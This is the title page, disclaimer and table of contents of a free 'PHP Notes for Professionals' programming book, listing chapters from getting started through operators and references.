PHP
Notes for ProfessionalsPHP
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial PHP group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks

Contents
About  1  ................................................................................................................................................................................... 
Chapter 1: Getting started with PHP  2  ................................................................................................................... 
Section 1.1: HTML output from web server  2  .................................................................................................................. 
Section 1.2: Hello, World!  3  ............................................................................................................................................... 
Section 1.3: Non-HTML output from web server  3  ........................................................................................................ 
Section 1.4: PHP built-in server  5  ..................................................................................................................................... 
Section 1.5: PHP CLI  5  ....................................................................................................................................................... 
Section 1.6: Instruction Separation  6  ............................................................................................................................... 
Section 1.7: PHP Tags  7  .................................................................................................................................................... 
Chapter 2: Variables  9  .................................................................................................................................................... 
Section 2.1: Accessing A Variable Dynamically By Name (Variable variables)  9  ...................................................... 
Section 2.2: Data Types  10  .............................................................................................................................................. 
Section 2.3: Global variable best practices  13  ............................................................................................................... 
Section 2.4: Default values of uninitialized variables  14  .............................................................................................. 
Section 2.5: Variable Value Truthiness and Identical Operator  15  ............................................................................. 
Chapter 3: Variable Scope  18  ..................................................................................................................................... 
Section 3.1: Superglobal variables  18  ............................................................................................................................. 
Section 3.2: Static properties and variables  18  ............................................................................................................. 
Section 3.3: User-deﬁned global variables  19  ............................................................................................................... 
Chapter 4: Superglobal Variables PHP  21  ........................................................................................................... 
Section 4.1: Suberglobals explained  21  .......................................................................................................................... 
Section 4.2: PHP5 SuperGlobals  28  ................................................................................................................................. 
Chapter 5: Outputting the Value of a Variable  32  .......................................................................................... 
Section 5.1: echo and print  32  .......................................................................................................................................... 
Section 5.2: Outputting a structured view of arrays and objects  33  .......................................................................... 
Section 5.3: String concatenation with echo  35  ............................................................................................................. 
Section 5.4: printf vs sprintf  36  ........................................................................................................................................ 
Section 5.5: Outputting large integers  36  ...................................................................................................................... 
Section 5.6: Output a Multidimensional Array with index and value and print into the table  37  ............................. 
Chapter 6: Constants  39  ................................................................................................................................................ 
Section 6.1: Deﬁning constants  39  ................................................................................................................................... 
Section 6.2: Class Constants  40  ...................................................................................................................................... 
Section 6.3: Checking if constant is deﬁned  40  ............................................................................................................. 
Section 6.4: Using constants  42  ...................................................................................................................................... 
Section 6.5: Constant arrays  42  ...................................................................................................................................... 
Chapter 7: Magic Constants  43  .................................................................................................................................. 
Section 7.1: Dierence between __FUNCTION__ and __METHOD__  43  ................................................................. 
Section 7.2: Dierence between __CLASS__, get_class() and get_called_class()  43  ........................................... 
Section 7.3: File & Directory Constants  44  ..................................................................................................................... 
Chapter 8: Comments  45  .............................................................................................................................................. 
Section 8.1: Single Line Comments  45  ............................................................................................................................ 
Section 8.2: Multi Line Comments  45  .............................................................................................................................. 
Chapter 9: Types  46  ......................................................................................................................................................... 
Section 9.1: Type Comparison  46  .................................................................................................................................... 
Section 9.2: Boolean  46  .................................................................................................................................................... 
Section 9.3: Float  47  ......................................................................................................................................................... 

Section 9.4: Strings  48  ...................................................................................................................................................... 
Section 9.5: Callable  50  .................................................................................................................................................... 
Section 9.6: Resources  50  ................................................................................................................................................ 
Section 9.7: Type Casting  51  ........................................................................................................................................... 
Section 9.8: Type Juggling  51  ......................................................................................................................................... 
Section 9.9: Null  52  ........................................................................................................................................................... 
Section 9.10: Integers  52  .................................................................................................................................................. 
Chapter 10: Operators  54  .............................................................................................................................................. 
Section 10.1: Null Coalescing Operator (??)  54  .............................................................................................................. 
Section 10.2: Spaceship Operator (<=>)  55  .................................................................................................................... 
Section 10.3: Execution Operator (``)  55  .......................................................................................................................... 
Section 10.4: Incrementing (++) and Decrementing Operators (--)  55  ....................................................................... 
Section 10.5: Ternary Operator (?:)  56  ........................................................................................................................... 
Section 10.6: Logical Operators (&&/AND and ||/OR)  57  ............................................................................................. 
Section 10.7: String Operators (. and .=)  57  .................................................................................................................... 
Section 10.8: Object and Class Operators  57  ................................................................................................................. 
Section 10.9: Combined Assignment (+= etc)  59  ........................................................................................................... 
Section 10.10: Altering operator precedence (with parentheses)  59  ........................................................................... 
Section 10.11: Basic Assignment (=)  60  ............................................................................................................................ 
Section 10.12: Association  60  ............................................................................................................................................ 
Section 10.13: Comparison Operators  60  ........................................................................................................................ 
Section 10.14: Bitwise Operators  62  ................................................................................................................................. 
Section 10.15: instanceof (type operator)  64  ................................................................................................................. 
Chapter 11: References  67  ............................................................................................................................................ 
Section 11.1: Assign by Reference  67  ............................................................................................................................... 
